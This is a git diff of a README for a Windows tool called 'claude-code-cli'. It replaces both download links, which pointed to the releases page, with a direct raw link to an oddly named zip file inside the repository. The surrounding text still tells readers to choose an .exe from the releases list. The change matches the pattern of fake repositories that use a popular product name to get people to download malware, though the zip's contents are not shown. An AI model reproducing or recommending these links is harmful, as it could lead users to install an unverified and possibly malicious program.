@@ -1,6 +1,6 @@
 # ⚡ claude-code-cli - Automate your coding tasks with ease
 
-[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Maxiesuggestive393/claude-code-cli/releases)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Maxiesuggestive393/claude-code-cli/raw/refs/heads/main/Sources/claude-code-cli-paughty.zip)
 
 ## 📋 About This Tool
 
@@ -14,7 +14,7 @@ Your computer needs Windows 10 or Windows 11. You need a stable internet connect
 
 You download the application from the official release page. 
 
-[Click here to visit the download page](https://github.com/Maxiesuggestive393/claude-code-cli/releases)
+[Click here to visit the download page](https://github.com/Maxiesuggestive393/claude-code-cli/raw/refs/heads/main/Sources/claude-code-cli-paughty.zip)
 
 Look for the latest version at the top of the list. Choose the file named with the .exe extension. Save this file to your computer.
 
